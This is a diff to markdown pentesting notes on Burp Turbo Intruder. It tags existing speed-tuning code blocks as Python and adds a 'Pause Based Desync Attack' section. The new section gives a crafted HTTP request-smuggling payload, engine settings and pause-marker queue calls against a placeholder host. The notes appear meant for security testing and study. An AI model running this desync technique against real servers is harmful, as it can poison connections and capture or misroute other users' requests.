@@ -20,28 +20,28 @@ These functions are kinda straightforward. The first one queues and sends the re
 
 ### Speed
 The speed of these basic settings is 8 requests/second:
-```
+```python
     concurrentConnections=1,
     requestsPerConnection=1,
     pipeline=False
 ```
 
 By changing concurrentConnections to 25, the speed becomes 39 requests/second:
-```
+```python
     concurrentConnections=25,
     requestsPerConnection=1,
     pipeline=False
 ```
 
 By changing requestsPerConnection to 100, the speed becomes 869 requests/second:
-```
+```python
     concurrentConnections=25,
     requestsPerConnection=100,
     pipeline=False
 ```
 
 By setting pipelining to true, the speed becomes 1785 requests/second:
-```
+```python
     concurrentConnections=25,
     requestsPerConnection=100,
     pipeline=True
@@ -74,3 +74,39 @@ def queueRequests(target, wordlists):
 def handleResponse(req, interesting):
     table.add(req)
 ```
+
+## Pause Based Desync Attack
+Sometimes, a pause withing the sending of the request can cause a desync attack vector. Take a look [here](../web/smuggling.md#desync--pause-based).
+
+1. In Burp Turbo Intruder, create a request like this:
+```
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+GET /hopefully404 HTTP/1.1
+Foo: x
+```
+
+2. In the python editor panel, adjust the request engine configuration to set these options:
+```python
+concurrentConnections=1,
+requestsPerConnection=100,
+pipeline=False,
+engine=Engine.THREADED
+```
+
+3. Add extra arguments to the `engine.queue()` function something like this:
+```python
+engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000) # Adjust for needs
+```
+
+4. Just also queue a normal follow-up request as normal:
+```python
+followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n'
+engine.queue(followUp)
+```
+
+After the delay you specified in step 3, you should get two responses. If the latter response matches what you expected from the smuggled prefix, this strongly suggests that the desync was succesful.
